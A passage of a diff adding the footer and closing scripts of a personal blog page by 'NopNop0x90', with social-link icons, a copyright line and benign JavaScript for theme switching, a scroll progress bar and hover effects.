+              <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/>
+            </svg>
+            GitHub
+          </a>
+          <a href="https://x.com/NopNop0x90" target="_blank" rel="noopener noreferrer">
+            <svg class="social-icon" width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/>
+            </svg>
+            Twitter
+          </a>
+          <a href="/feed.xml">
+            <svg class="social-icon" width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/>
+            </svg>
+            RSS
+          </a>
+        </div>
+        <p class="copyright">&copy; 2025 NopNop0x90. All rights reserved.</p>
+      </div>
+    </footer>
+  </div>
+
+  <!-- JavaScript -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      // Apply saved theme
+      const savedTheme = localStorage.getItem('theme') || 'dark';
+      document.documentElement.classList.remove('dark', 'light');
+      document.documentElement.classList.add(savedTheme);
+      document.body.classList.remove('dark', 'light');
+      document.body.classList.add(savedTheme);
+  
+      // Scroll progress
+      const progressBar = document.querySelector('.progress-bar');
+      if (progressBar) {
+        window.addEventListener('scroll', () => {
+          const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
+          const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+          const scrolled = (winScroll / height) * 100;
+          progressBar.style.width = scrolled + '%';
+        });
+      }
+  
+      // Add animation to post items
+      const postItems = document.querySelectorAll('.post-item');
+      postItems.forEach((item, index) => {
+        item.style.animationDelay = `${0.1 * index}s`;
+      });
+  
+      // Pagination button hover effects
+      const pageLinks = document.querySelectorAll('.page-link:not(.disabled)');
+      pageLinks.forEach(link => {
+        link.addEventListener('mouseenter', () => link.classList.add('hover'));
+        link.addEventListener('mouseleave', () => link.classList.remove('hover'));
+      });
+    });
+  </script>
+  
+  <!-- External JavaScript files -->
+  <script src="/assets/js/theme-switcher.js"></script>
+  <script src="/assets/js/mobile-menu.js"></script>
+  <script src="/assets/js/copy.js"></script>
+  
+  
+  
+</body>
+</html>
